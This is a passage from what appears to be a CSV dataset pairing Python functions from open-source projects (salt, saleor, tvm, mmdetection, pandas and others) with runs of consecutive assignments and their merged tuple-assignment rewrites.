        """"""
        Test GeoJSON() function with Z values.
        """"""
        self._load_city_data()
        h = City3D.objects.annotate(geojson=AsGeoJSON('point', precision=6)).get(name='Houston')
        # GeoJSON should be 3D
        # `SELECT ST_AsGeoJSON(point, 6) FROM geo3d_city3d WHERE name='Houston';`
        ref_json_regex = re.compile(r'^{""type"":""Point"",""coordinates"":\[-95.363151,29.763374,18(\.0+)?\]}$')
        self.assertTrue(ref_json_regex.match(h.geojson))","h = City3D.objects.annotate(geojson=AsGeoJSON('point', precision=6)).get(name='Houston')
ref_json_regex = re.compile('^{""type"":""Point"",""coordinates"":\\[-95.363151,29.763374,18(\\.0+)?\\]}$')","h , ref_json_regex  = City3D.objects.annotate(geojson=AsGeoJSON('point', precision=6)).get(name='Houston'), re.compile('^{""type"":""Point"",""coordinates"":\\[-95.363151,29.763374,18(\\.0+)?\\]}$')"
openstates-scrapers,https://github.com/openstates/openstates-scrapers/tree/master/scrapers/ri/events.py,RIEventScraper,scrape_chamber$160,"def scrape_chamber(self, chamber):
        offset = column_order[chamber]
        page = self.lxmlize(agenda_url)
        rows = page.xpath(""//table[@class='agenda_table']/tr"")[1:]
        for row in rows:
            ctty = row.xpath(""./td"")[offset]
            to_scrape = ctty.xpath(""./a"")
            for page in to_scrape:
                yield from self.scrape_agenda_dir(chamber, page.attrib[""href""])","offset = column_order[chamber]
page = self.lxmlize(agenda_url)","offset , page  = column_order[chamber], self.lxmlize(agenda_url)"
taskonomy,https://github.com/StanfordVL/taskonomy/tree/master/code/tools/script/preprocess/preprocess_per_models.py,,single_images_combine$263,"def single_images_combine( root_dir, asset_dir, models, unit_size ):
    # Single Images
    for split in ['train', 'val', 'test']:
        filename_list = [] 
        filenames = []
        count = 0
        num_split = 0
        for modelID in models[split]:
            #model_names = single_image_per_model(root_dir, modelID)
            per_model_file = '{ID}_image.npy'.format(ID=modelID)
            per_model_file = os.path.join(root_dir, modelID, per_model_file)
            print(per_model_file)
            with open(per_model_file, 'r') as fp:
                model_names = np.load(per_model_file)
            filenames.extend(model_names)
            count = count + len(model_names)

            while count > unit_size * (num_split + 1):
                #save filenames
                random.shuffle(filenames)
                fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
                store_location = os.path.join( asset_dir, fname )
                with open(store_location, 'wb') as store:
                    np.save(store, np.asarray(filenames[:unit_size]))
                filename_list.append(fname)
                filenames = filenames[unit_size:]
                num_split = num_split + 1
        
        random.shuffle(filenames)
        filenames = np.asarray(filenames)
        fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
        store_location = os.path.join( asset_dir, fname )
        with open(store_location, 'wb') as store:
            np.save(store, filenames)
        filename_list.append(fname)

        split_info = {'total_size': count, 'unit_size' : unit_size, 'filename_list': filename_list}
        
        split_info_location = os.path.join( asset_dir, '{split}_split_image_info.pkl'.format(split=split) )
        pickle.dump( split_info, open( split_info_location, ""wb"" ) )","filename_list = []
filenames = []
count = 0
num_split = 0","filename_list , filenames , count , num_split  = [], [], 0, 0"
taskonomy,https://github.com/StanfordVL/taskonomy/tree/master/code/tools/script/preprocess/preprocess_per_models.py,,single_images_combine$263,"def single_images_combine( root_dir, asset_dir, models, unit_size ):
    # Single Images
    for split in ['train', 'val', 'test']:
        filename_list = [] 
        filenames = []
        count = 0
        num_split = 0
        for modelID in models[split]:
            #model_names = single_image_per_model(root_dir, modelID)
            per_model_file = '{ID}_image.npy'.format(ID=modelID)
            per_model_file = os.path.join(root_dir, modelID, per_model_file)
            print(per_model_file)
            with open(per_model_file, 'r') as fp:
                model_names = np.load(per_model_file)
            filenames.extend(model_names)
            count = count + len(model_names)

            while count > unit_size * (num_split + 1):
                #save filenames
                random.shuffle(filenames)
                fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
                store_location = os.path.join( asset_dir, fname )
                with open(store_location, 'wb') as store:
                    np.save(store, np.asarray(filenames[:unit_size]))
                filename_list.append(fname)
                filenames = filenames[unit_size:]
                num_split = num_split + 1
        
        random.shuffle(filenames)
        filenames = np.asarray(filenames)
        fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
        store_location = os.path.join( asset_dir, fname )
        with open(store_location, 'wb') as store:
            np.save(store, filenames)
        filename_list.append(fname)

        split_info = {'total_size': count, 'unit_size' : unit_size, 'filename_list': filename_list}
        
        split_info_location = os.path.join( asset_dir, '{split}_split_image_info.pkl'.format(split=split) )
        pickle.dump( split_info, open( split_info_location, ""wb"" ) )","filenames = np.asarray(filenames)
fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)","filenames , fname  = np.asarray(filenames), '{split}_image_split_{i}.npy'.format(split=split, i=num_split)"
taskonomy,https://github.com/StanfordVL/taskonomy/tree/master/code/tools/script/preprocess/preprocess_per_models.py,,single_images_combine$263,"def single_images_combine( root_dir, asset_dir, models, unit_size ):
    # Single Images
    for split in ['train', 'val', 'test']:
        filename_list = [] 
        filenames = []
        count = 0
        num_split = 0
        for modelID in models[split]:
            #model_names = single_image_per_model(root_dir, modelID)
            per_model_file = '{ID}_image.npy'.format(ID=modelID)
            per_model_file = os.path.join(root_dir, modelID, per_model_file)
            print(per_model_file)
            with open(per_model_file, 'r') as fp:
                model_names = np.load(per_model_file)
            filenames.extend(model_names)
            count = count + len(model_names)

            while count > unit_size * (num_split + 1):
                #save filenames
                random.shuffle(filenames)
                fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
                store_location = os.path.join( asset_dir, fname )
                with open(store_location, 'wb') as store:
                    np.save(store, np.asarray(filenames[:unit_size]))
                filename_list.append(fname)
                filenames = filenames[unit_size:]
                num_split = num_split + 1
        
        random.shuffle(filenames)
        filenames = np.asarray(filenames)
        fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
        store_location = os.path.join( asset_dir, fname )
        with open(store_location, 'wb') as store:
            np.save(store, filenames)
        filename_list.append(fname)

        split_info = {'total_size': count, 'unit_size' : unit_size, 'filename_list': filename_list}
        
        split_info_location = os.path.join( asset_dir, '{split}_split_image_info.pkl'.format(split=split) )
        pickle.dump( split_info, open( split_info_location, ""wb"" ) )","split_info = {'total_size': count, 'unit_size': unit_size, 'filename_list': filename_list}
split_info_location = os.path.join(asset_dir, '{split}_split_image_info.pkl'.format(split=split))","split_info , split_info_location  = {'total_size': count, 'unit_size': unit_size, 'filename_list': filename_list}, os.path.join(asset_dir, '{split}_split_image_info.pkl'.format(split=split))"
taskonomy,https://github.com/StanfordVL/taskonomy/tree/master/code/tools/script/preprocess/preprocess_per_models.py,,single_images_combine$263,"def single_images_combine( root_dir, asset_dir, models, unit_size ):
    # Single Images
    for split in ['train', 'val', 'test']:
        filename_list = [] 
        filenames = []
        count = 0
        num_split = 0
        for modelID in models[split]:
            #model_names = single_image_per_model(root_dir, modelID)
            per_model_file = '{ID}_image.npy'.format(ID=modelID)
            per_model_file = os.path.join(root_dir, modelID, per_model_file)
            print(per_model_file)
            with open(per_model_file, 'r') as fp:
                model_names = np.load(per_model_file)
            filenames.extend(model_names)
            count = count + len(model_names)

            while count > unit_size * (num_split + 1):
                #save filenames
                random.shuffle(filenames)
                fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
                store_location = os.path.join( asset_dir, fname )
                with open(store_location, 'wb') as store:
                    np.save(store, np.asarray(filenames[:unit_size]))
                filename_list.append(fname)
                filenames = filenames[unit_size:]
                num_split = num_split + 1
        
        random.shuffle(filenames)
        filenames = np.asarray(filenames)
        fname = '{split}_image_split_{i}.npy'.format(split=split, i=num_split)
        store_location = os.path.join( asset_dir, fname )
        with open(store_location, 'wb') as store:
            np.save(store, filenames)
        filename_list.append(fname)

        split_info = {'total_size': count, 'unit_size' : unit_size, 'filename_list': filename_list}
        
        split_info_location = os.path.join( asset_dir, '{split}_split_image_info.pkl'.format(split=split) )
        pickle.dump( split_info, open( split_info_location, ""wb"" ) )","filenames = filenames[unit_size:]
num_split = num_split + 1","filenames , num_split  = filenames[unit_size:], num_split + 1"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/boto3_elasticsearch.py,,describe_elasticsearch_instance_type_limits$524,"def describe_elasticsearch_instance_type_limits(
    instance_type,
    elasticsearch_version,
    domain_name=None,
    region=None,
    keyid=None,
    key=None,
    profile=None,
):
    """"""
    Describe Elasticsearch Limits for a given InstanceType and ElasticsearchVersion.
    When modifying existing Domain, specify the `` DomainName `` to know what Limits
    are supported for modifying.

    :param str instance_type: The instance type for an Elasticsearch cluster for
        which Elasticsearch ``Limits`` are needed.
    :param str elasticsearch_version: Version of Elasticsearch for which ``Limits``
        are needed.
    :param str domain_name: Represents the name of the Domain that we are trying
        to modify. This should be present only if we are querying for Elasticsearch
        ``Limits`` for existing domain.

    :rtype: dict
    :return: Dictionary with key 'result' and as value a boolean denoting success or failure.
        Upon success, also contains a key 'reponse' with the limits information.
        Upon failure, also contains a key 'error' with the error message as value.

    .. versionadded:: 3001

    CLI Example:

    .. code-block:: bash

        salt myminion boto3_elasticsearch.describe_elasticsearch_instance_type_limits \\
          instance_type=r3.8xlarge.elasticsearch \\
          elasticsearch_version='6.2'
    """"""
    ret = {""result"": False}
    boto_params = salt.utils.data.filter_falsey(
        {
            ""DomainName"": domain_name,
            ""InstanceType"": instance_type,
            ""ElasticsearchVersion"": str(elasticsearch_version),
        }
    )
    try:
        conn = _get_conn(region=region, keyid=keyid, key=key, profile=profile)
        res = conn.describe_elasticsearch_instance_type_limits(**boto_params)
        if res and ""LimitsByRole"" in res:
            ret[""result""] = True
            ret[""response""] = res[""LimitsByRole""]
    except (ParamValidationError, ClientError) as exp:
        ret.update({""error"": __utils__[""boto3.get_error""](exp)[""message""]})
    return ret","ret = {'result': False}
boto_params = salt.utils.data.filter_falsey({'DomainName': domain_name, 'InstanceType': instance_type, 'ElasticsearchVersion': str(elasticsearch_version)})","ret , boto_params  = {'result': False}, salt.utils.data.filter_falsey({'DomainName': domain_name, 'InstanceType': instance_type, 'ElasticsearchVersion': str(elasticsearch_version)})"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/boto3_elasticsearch.py,,describe_elasticsearch_instance_type_limits$524,"def describe_elasticsearch_instance_type_limits(
    instance_type,
    elasticsearch_version,
    domain_name=None,
    region=None,
    keyid=None,
    key=None,
    profile=None,
):
    """"""
    Describe Elasticsearch Limits for a given InstanceType and ElasticsearchVersion.
    When modifying existing Domain, specify the `` DomainName `` to know what Limits
    are supported for modifying.

    :param str instance_type: The instance type for an Elasticsearch cluster for
        which Elasticsearch ``Limits`` are needed.
    :param str elasticsearch_version: Version of Elasticsearch for which ``Limits``
        are needed.
    :param str domain_name: Represents the name of the Domain that we are trying
        to modify. This should be present only if we are querying for Elasticsearch
        ``Limits`` for existing domain.

    :rtype: dict
    :return: Dictionary with key 'result' and as value a boolean denoting success or failure.
        Upon success, also contains a key 'reponse' with the limits information.
        Upon failure, also contains a key 'error' with the error message as value.

    .. versionadded:: 3001

    CLI Example:

    .. code-block:: bash

        salt myminion boto3_elasticsearch.describe_elasticsearch_instance_type_limits \\
          instance_type=r3.8xlarge.elasticsearch \\
          elasticsearch_version='6.2'
    """"""
    ret = {""result"": False}
    boto_params = salt.utils.data.filter_falsey(
        {
            ""DomainName"": domain_name,
            ""InstanceType"": instance_type,
            ""ElasticsearchVersion"": str(elasticsearch_version),
        }
    )
    try:
        conn = _get_conn(region=region, keyid=keyid, key=key, profile=profile)
        res = conn.describe_elasticsearch_instance_type_limits(**boto_params)
        if res and ""LimitsByRole"" in res:
            ret[""result""] = True
            ret[""response""] = res[""LimitsByRole""]
    except (ParamValidationError, ClientError) as exp:
        ret.update({""error"": __utils__[""boto3.get_error""](exp)[""message""]})
    return ret","ret['result'] = True
ret['response'] = res['LimitsByRole']","ret['result'] , ret['response']  = True, res['LimitsByRole']"
saleor,https://github.com/saleor/saleor/tree/master/saleor/payment/gateways/stripe/tests/test_webhooks.py,,test_handle_authorized_payment_intent_for_checkout$385,"def test_handle_authorized_payment_intent_for_checkout(
    _wrapped_update_payment_method,
    wrapped_checkout_complete,
    payment_stripe_for_checkout,
    checkout_with_items,
    stripe_plugin,
    channel_USD,
):
    payment = payment_stripe_for_checkout
    payment.to_confirm = True
    payment.save()
    payment.transactions.create(
        is_success=True,
        action_required=True,
        kind=TransactionKind.ACTION_TO_CONFIRM,
        amount=payment.total,
        currency=payment.currency,
        token=""ABC"",
        gateway_response={},
    )
    plugin = stripe_plugin()
    payment_intent = StripeObject(id=""ABC"", last_response={})
    payment_intent[""amount""] = price_to_minor_unit(payment.total, payment.currency)
    payment_intent[""currency""] = payment.currency
    payment_intent[""status""] = AUTHORIZED_STATUS
    payment_intent[""payment_method""] = StripeObject()
    handle_authorized_payment_intent(payment_intent, plugin.config, channel_USD.slug)

    payment.refresh_from_db()

    assert wrapped_checkout_complete.called
    assert payment.checkout_id is None
    assert not payment.cc_brand
    assert not payment.cc_last_digits
    assert not payment.cc_exp_year
    assert not payment.cc_exp_month
    assert not payment.payment_method_type
    assert payment.order
    assert payment.order.checkout_token == str(checkout_with_items.token)
    transaction = payment.transactions.get(kind=TransactionKind.AUTH)
    assert transaction.token == payment_intent.id","plugin = stripe_plugin()
payment_intent = StripeObject(id='ABC', last_response={})","plugin , payment_intent  = stripe_plugin(), StripeObject(id='ABC', last_response={})"
saleor,https://github.com/saleor/saleor/tree/master/saleor/payment/gateways/stripe/tests/test_webhooks.py,,test_handle_authorized_payment_intent_for_checkout$385,"def test_handle_authorized_payment_intent_for_checkout(
    _wrapped_update_payment_method,
    wrapped_checkout_complete,
    payment_stripe_for_checkout,
    checkout_with_items,
    stripe_plugin,
    channel_USD,
):
    payment = payment_stripe_for_checkout
    payment.to_confirm = True
    payment.save()
    payment.transactions.create(
        is_success=True,
        action_required=True,
        kind=TransactionKind.ACTION_TO_CONFIRM,
        amount=payment.total,
        currency=payment.currency,
        token=""ABC"",
        gateway_response={},
    )
    plugin = stripe_plugin()
    payment_intent = StripeObject(id=""ABC"", last_response={})
    payment_intent[""amount""] = price_to_minor_unit(payment.total, payment.currency)
    payment_intent[""currency""] = payment.currency
    payment_intent[""status""] = AUTHORIZED_STATUS
    payment_intent[""payment_method""] = StripeObject()
    handle_authorized_payment_intent(payment_intent, plugin.config, channel_USD.slug)

    payment.refresh_from_db()

    assert wrapped_checkout_complete.called
    assert payment.checkout_id is None
    assert not payment.cc_brand
    assert not payment.cc_last_digits
    assert not payment.cc_exp_year
    assert not payment.cc_exp_month
    assert not payment.payment_method_type
    assert payment.order
    assert payment.order.checkout_token == str(checkout_with_items.token)
    transaction = payment.transactions.get(kind=TransactionKind.AUTH)
    assert transaction.token == payment_intent.id","payment_intent['amount'] = price_to_minor_unit(payment.total, payment.currency)
payment_intent['currency'] = payment.currency
payment_intent['status'] = AUTHORIZED_STATUS
payment_intent['payment_method'] = StripeObject()","payment_intent['amount'] , payment_intent['currency'] , payment_intent['status'] , payment_intent['payment_method']  = price_to_minor_unit(payment.total, payment.currency), payment.currency, AUTHORIZED_STATUS, StripeObject()"
tvm,https://github.com/apache/tvm/tree/master/tests/python/unittest/test_runtime_module_based_interface.py,,verify_gpu_export$239,"def verify_gpu_export(obj_format):
        if not tvm.testing.device_enabled(""cuda""):
            print(""Skip because cuda is not enabled"")
            return
        mod, params = relay.testing.synthetic.get_workload()
        with relay.build_config(opt_level=3):
            complied_graph_lib = relay.build_module.build(mod, ""cuda"", params=params)

        from tvm.contrib import utils

        temp = utils.tempdir()
        if obj_format == "".so"":
            file_name = ""deploy_lib.so""
        else:
            assert obj_format == "".tar""
            file_name = ""deploy_lib.tar""
        path_lib = temp.relpath(file_name)
        complied_graph_lib.export_library(path_lib)

        data = np.random.uniform(-1, 1, size=input_shape(mod)).astype(""float32"")

        # run the setup in a separate function, so the load_lib
        # can get destructed right away
        # test the robustness wrt to parent module destruction
        def setup_gmod():
            loaded_lib = tvm.runtime.load_module(path_lib)
            dev = tvm.cuda()
            return loaded_lib[""default""](dev)

        gmod = setup_gmod()
        # raw api
        set_input = gmod[""set_input""]
        run = gmod[""run""]
        get_output = gmod[""get_output""]
        set_input(""data"", tvm.nd.array(data))
        run()
        out = get_output(0).numpy()
        tvm.testing.assert_allclose(out, verify(data), atol=1e-5)

        # graph executor wrapper
        gmod = graph_executor.GraphModule(setup_gmod())
        gmod.set_input(""data"", data)
        gmod.run()
        out = gmod.get_output(0).numpy()
        tvm.testing.assert_allclose(out, verify(data), atol=1e-5)","set_input = gmod['set_input']
run = gmod['run']
get_output = gmod['get_output']","set_input , run , get_output  = gmod['set_input'], gmod['run'], gmod['get_output']"
tvm,https://github.com/apache/tvm/tree/master/tests/python/unittest/test_runtime_module_based_interface.py,,verify_gpu_export$239,"def verify_gpu_export(obj_format):
        if not tvm.testing.device_enabled(""cuda""):
            print(""Skip because cuda is not enabled"")
            return
        mod, params = relay.testing.synthetic.get_workload()
        with relay.build_config(opt_level=3):
            complied_graph_lib = relay.build_module.build(mod, ""cuda"", params=params)

        from tvm.contrib import utils

        temp = utils.tempdir()
        if obj_format == "".so"":
            file_name = ""deploy_lib.so""
        else:
            assert obj_format == "".tar""
            file_name = ""deploy_lib.tar""
        path_lib = temp.relpath(file_name)
        complied_graph_lib.export_library(path_lib)

        data = np.random.uniform(-1, 1, size=input_shape(mod)).astype(""float32"")

        # run the setup in a separate function, so the load_lib
        # can get destructed right away
        # test the robustness wrt to parent module destruction
        def setup_gmod():
            loaded_lib = tvm.runtime.load_module(path_lib)
            dev = tvm.cuda()
            return loaded_lib[""default""](dev)

        gmod = setup_gmod()
        # raw api
        set_input = gmod[""set_input""]
        run = gmod[""run""]
        get_output = gmod[""get_output""]
        set_input(""data"", tvm.nd.array(data))
        run()
        out = get_output(0).numpy()
        tvm.testing.assert_allclose(out, verify(data), atol=1e-5)

        # graph executor wrapper
        gmod = graph_executor.GraphModule(setup_gmod())
        gmod.set_input(""data"", data)
        gmod.run()
        out = gmod.get_output(0).numpy()
        tvm.testing.assert_allclose(out, verify(data), atol=1e-5)","loaded_lib = tvm.runtime.load_module(path_lib)
dev = tvm.cuda()","loaded_lib , dev  = tvm.runtime.load_module(path_lib), tvm.cuda()"
ai-economist,https://github.com/salesforce/ai-economist/tree/master/tutorials/rllib/tf_models.py,RandomAction,__init__$393,"def __init__(self, obs_space, action_space, num_outputs, model_config, name):
        super().__init__(obs_space, action_space, num_outputs, model_config, name)

        if hasattr(obs_space, ""original_space""):
            original_space = obs_space.original_space
        else:
            assert isinstance(obs_space, Dict)
            original_space = obs_space

        mask = original_space.spaces[_MASK_NAME]
        mask_input = keras.layers.Input(shape=mask.shape, name=_MASK_NAME)

        self.inputs = [
            keras.layers.Input(shape=(1,), name=""observations""),
            mask_input,
        ]

        logits_and_value = keras.layers.Dense(
            num_outputs + 1, activation=None, name=""dummy_layer""
        )(self.inputs[0])

        unmasked_logits = logits_and_value[:, :num_outputs] * 0.0
        values = logits_and_value[:, -1]

        masked_logits = apply_logit_mask(unmasked_logits, mask_input)

        self.base_model = keras.Model(self.inputs, [masked_logits, values])
        self.register_variables(self.base_model.variables)

        # This will be set in the forward() call below
        self.values = None","values = logits_and_value[:, -1]
masked_logits = apply_logit_mask(unmasked_logits, mask_input)","values , masked_logits  = logits_and_value[:, -1], apply_logit_mask(unmasked_logits, mask_input)"
category_encoders,https://github.com/scikit-learn-contrib/category_encoders/tree/master/category_encoders/wrapper.py,PolynomialWrapper,fit_transform$92,"def fit_transform(self, X, y=None, **fit_params):
        # When we are training the feature encoders, we have to use fit_transform() method on the features.

        # unite the input into pandas types
        X, y = utils.convert_inputs(X, y)
        y = pd.DataFrame(y, columns=['target'])

        # apply one-hot-encoder on the label
        self.label_encoder = encoders.OneHotEncoder(handle_missing='error', handle_unknown='error', cols=['target'], drop_invariant=True,
                                                    use_cat_names=True)
        labels = self.label_encoder.fit_transform(y)
        labels.columns = [column[7:] for column in labels.columns]
        labels = labels.iloc[:, 1:]  # drop one label

        # initialization of the feature encoders
        encoded = None
        feature_encoder = None
        all_new_features = pd.DataFrame()

        # fit_transform the feature encoders
        for class_name, label in labels.iteritems():
            feature_encoder = copy.deepcopy(self.feature_encoder)
            encoded = feature_encoder.fit_transform(X, label)

            # decorate the encoded features with the label class suffix
            new_features = encoded[feature_encoder.cols]
            new_features.columns = [str(column) + '_' + class_name for column in new_features.columns]

            all_new_features = pd.concat((all_new_features, new_features), axis=1)
            self.feature_encoders[class_name] = feature_encoder

        # add features that were not encoded
        result = pd.concat((encoded[encoded.columns[~encoded.columns.isin(feature_encoder.cols)]], all_new_features), axis=1)

        return result","y = pd.DataFrame(y, columns=['target'])
self.label_encoder = encoders.OneHotEncoder(handle_missing='error', handle_unknown='error', cols=['target'], drop_invariant=True, use_cat_names=True)","y , self.label_encoder  = pd.DataFrame(y, columns=['target']), encoders.OneHotEncoder(handle_missing='error', handle_unknown='error', cols=['target'], drop_invariant=True, use_cat_names=True)"
category_encoders,https://github.com/scikit-learn-contrib/category_encoders/tree/master/category_encoders/wrapper.py,PolynomialWrapper,fit_transform$92,"def fit_transform(self, X, y=None, **fit_params):
        # When we are training the feature encoders, we have to use fit_transform() method on the features.

        # unite the input into pandas types
        X, y = utils.convert_inputs(X, y)
        y = pd.DataFrame(y, columns=['target'])

        # apply one-hot-encoder on the label
        self.label_encoder = encoders.OneHotEncoder(handle_missing='error', handle_unknown='error', cols=['target'], drop_invariant=True,
                                                    use_cat_names=True)
        labels = self.label_encoder.fit_transform(y)
        labels.columns = [column[7:] for column in labels.columns]
        labels = labels.iloc[:, 1:]  # drop one label

        # initialization of the feature encoders
        encoded = None
        feature_encoder = None
        all_new_features = pd.DataFrame()

        # fit_transform the feature encoders
        for class_name, label in labels.iteritems():
            feature_encoder = copy.deepcopy(self.feature_encoder)
            encoded = feature_encoder.fit_transform(X, label)

            # decorate the encoded features with the label class suffix
            new_features = encoded[feature_encoder.cols]
            new_features.columns = [str(column) + '_' + class_name for column in new_features.columns]

            all_new_features = pd.concat((all_new_features, new_features), axis=1)
            self.feature_encoders[class_name] = feature_encoder

        # add features that were not encoded
        result = pd.concat((encoded[encoded.columns[~encoded.columns.isin(feature_encoder.cols)]], all_new_features), axis=1)

        return result","labels = labels.iloc[:, 1:]
encoded = None
feature_encoder = None
all_new_features = pd.DataFrame()","labels , encoded , feature_encoder , all_new_features  = labels.iloc[:, 1:], None, None, pd.DataFrame()"
category_encoders,https://github.com/scikit-learn-contrib/category_encoders/tree/master/category_encoders/wrapper.py,PolynomialWrapper,fit_transform$92,"def fit_transform(self, X, y=None, **fit_params):
        # When we are training the feature encoders, we have to use fit_transform() method on the features.

        # unite the input into pandas types
        X, y = utils.convert_inputs(X, y)
        y = pd.DataFrame(y, columns=['target'])

        # apply one-hot-encoder on the label
        self.label_encoder = encoders.OneHotEncoder(handle_missing='error', handle_unknown='error', cols=['target'], drop_invariant=True,
                                                    use_cat_names=True)
        labels = self.label_encoder.fit_transform(y)
        labels.columns = [column[7:] for column in labels.columns]
        labels = labels.iloc[:, 1:]  # drop one label

        # initialization of the feature encoders
        encoded = None
        feature_encoder = None
        all_new_features = pd.DataFrame()

        # fit_transform the feature encoders
        for class_name, label in labels.iteritems():
            feature_encoder = copy.deepcopy(self.feature_encoder)
            encoded = feature_encoder.fit_transform(X, label)

            # decorate the encoded features with the label class suffix
            new_features = encoded[feature_encoder.cols]
            new_features.columns = [str(column) + '_' + class_name for column in new_features.columns]

            all_new_features = pd.concat((all_new_features, new_features), axis=1)
            self.feature_encoders[class_name] = feature_encoder

        # add features that were not encoded
        result = pd.concat((encoded[encoded.columns[~encoded.columns.isin(feature_encoder.cols)]], all_new_features), axis=1)

        return result","all_new_features = pd.concat((all_new_features, new_features), axis=1)
self.feature_encoders[class_name] = feature_encoder","all_new_features , self.feature_encoders[class_name]  = pd.concat((all_new_features, new_features), axis=1), feature_encoder"
mmdetection,https://github.com/open-mmlab/mmdetection/tree/master/mmdet/core/bbox/assigners/sim_ota_assigner.py,SimOTAAssigner,dynamic_k_matching$230,"def dynamic_k_matching(self, cost, pairwise_ious, num_gt, valid_mask):
        matching_matrix = torch.zeros_like(cost, dtype=torch.uint8)
        # select candidate topk ious for dynamic-k calculation
        candidate_topk = min(self.candidate_topk, pairwise_ious.size(0))
        topk_ious, _ = torch.topk(pairwise_ious, candidate_topk, dim=0)
        # calculate dynamic k for each gt
        dynamic_ks = torch.clamp(topk_ious.sum(0).int(), min=1)
        for gt_idx in range(num_gt):
            _, pos_idx = torch.topk(
                cost[:, gt_idx], k=dynamic_ks[gt_idx], largest=False)
            matching_matrix[:, gt_idx][pos_idx] = 1

        del topk_ious, dynamic_ks, pos_idx

        prior_match_gt_mask = matching_matrix.sum(1) > 1
        if prior_match_gt_mask.sum() > 0:
            cost_min, cost_argmin = torch.min(
                cost[prior_match_gt_mask, :], dim=1)
            matching_matrix[prior_match_gt_mask, :] *= 0
            matching_matrix[prior_match_gt_mask, cost_argmin] = 1
        # get foreground mask inside box and center prior
        fg_mask_inboxes = matching_matrix.sum(1) > 0
        valid_mask[valid_mask.clone()] = fg_mask_inboxes

        matched_gt_inds = matching_matrix[fg_mask_inboxes, :].argmax(1)
        matched_pred_ious = (matching_matrix *
                             pairwise_ious).sum(1)[fg_mask_inboxes]
        return matched_pred_ious, matched_gt_inds","matching_matrix = torch.zeros_like(cost, dtype=torch.uint8)
candidate_topk = min(self.candidate_topk, pairwise_ious.size(0))","matching_matrix , candidate_topk  = torch.zeros_like(cost, dtype=torch.uint8), min(self.candidate_topk, pairwise_ious.size(0))"
mmdetection,https://github.com/open-mmlab/mmdetection/tree/master/mmdet/core/bbox/assigners/sim_ota_assigner.py,SimOTAAssigner,dynamic_k_matching$230,"def dynamic_k_matching(self, cost, pairwise_ious, num_gt, valid_mask):
        matching_matrix = torch.zeros_like(cost, dtype=torch.uint8)
        # select candidate topk ious for dynamic-k calculation
        candidate_topk = min(self.candidate_topk, pairwise_ious.size(0))
        topk_ious, _ = torch.topk(pairwise_ious, candidate_topk, dim=0)
        # calculate dynamic k for each gt
        dynamic_ks = torch.clamp(topk_ious.sum(0).int(), min=1)
        for gt_idx in range(num_gt):
            _, pos_idx = torch.topk(
                cost[:, gt_idx], k=dynamic_ks[gt_idx], largest=False)
            matching_matrix[:, gt_idx][pos_idx] = 1

        del topk_ious, dynamic_ks, pos_idx

        prior_match_gt_mask = matching_matrix.sum(1) > 1
        if prior_match_gt_mask.sum() > 0:
            cost_min, cost_argmin = torch.min(
                cost[prior_match_gt_mask, :], dim=1)
            matching_matrix[prior_match_gt_mask, :] *= 0
            matching_matrix[prior_match_gt_mask, cost_argmin] = 1
        # get foreground mask inside box and center prior
        fg_mask_inboxes = matching_matrix.sum(1) > 0
        valid_mask[valid_mask.clone()] = fg_mask_inboxes

        matched_gt_inds = matching_matrix[fg_mask_inboxes, :].argmax(1)
        matched_pred_ious = (matching_matrix *
                             pairwise_ious).sum(1)[fg_mask_inboxes]
        return matched_pred_ious, matched_gt_inds","valid_mask[valid_mask.clone()] = fg_mask_inboxes
matched_gt_inds = matching_matrix[fg_mask_inboxes, :].argmax(1)
matched_pred_ious = (matching_matrix * pairwise_ious).sum(1)[fg_mask_inboxes]","valid_mask[valid_mask.clone()] , matched_gt_inds , matched_pred_ious  = fg_mask_inboxes, matching_matrix[fg_mask_inboxes, :].argmax(1), (matching_matrix * pairwise_ious).sum(1)[fg_mask_inboxes]"
MACHIN3tools,https://github.com/machin3io/MACHIN3tools/tree/master/utils/view.py,,set_xray$5,"def set_xray(context):
    x = (context.scene.M3.pass_through, context.scene.M3.show_edit_mesh_wire)
    shading = context.space_data.shading

    shading.show_xray = True if any(x) else False

    if context.scene.M3.show_edit_mesh_wire:
        shading.xray_alpha = 0.1

    elif context.scene.M3.pass_through:
        shading.xray_alpha = 1 if context.active_object and context.active_object.type == ""MESH"" else 0.5","x = (context.scene.M3.pass_through, context.scene.M3.show_edit_mesh_wire)
shading = context.space_data.shading","x , shading  = (context.scene.M3.pass_through, context.scene.M3.show_edit_mesh_wire), context.space_data.shading"
Ghostwriter,https://github.com/GhostManager/Ghostwriter/tree/master/ghostwriter/rolodex/tests/test_views.py,RollCodenameViewTests,setUp$129,"def setUp(self):
        self.client = Client()
        self.client_auth = Client()
        self.client_auth.login(username=self.user.username, password=PASSWORD)
        self.assertTrue(
            self.client_auth.login(username=self.user.username, password=PASSWORD)
        )","self.client = Client()
self.client_auth = Client()","self.client , self.client_auth  = Client(), Client()"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/io/formats/style/test_to_latex.py,,test_multi_options$335,"def test_multi_options(df_ext):
    cidx = MultiIndex.from_tuples([(""Z"", ""a""), (""Z"", ""b""), (""Y"", ""c"")])
    ridx = MultiIndex.from_tuples([(""A"", ""a""), (""A"", ""b""), (""B"", ""c"")])
    df_ext.index, df_ext.columns = ridx, cidx
    styler = df_ext.style.format(precision=2)

    expected = dedent(
        """"""\
     &  & \\multicolumn{2}{r}{Z} & Y \\\\
     &  & a & b & c \\\\
    \\multirow[c]{2}{*}{A} & a & 0 & -0.61 & ab \\\\
    """"""
    )
    result = styler.to_latex()
    assert expected in result

    with option_context(""styler.latex.multicol_align"", ""l""):
        assert "" &  & \\multicolumn{2}{l}{Z} & Y \\\\"" in styler.to_latex()

    with option_context(""styler.latex.multirow_align"", ""b""):
        assert ""\\multirow[b]{2}{*}{A} & a & 0 & -0.61 & ab \\\\"" in styler.to_latex()","cidx = MultiIndex.from_tuples([('Z', 'a'), ('Z', 'b'), ('Y', 'c')])
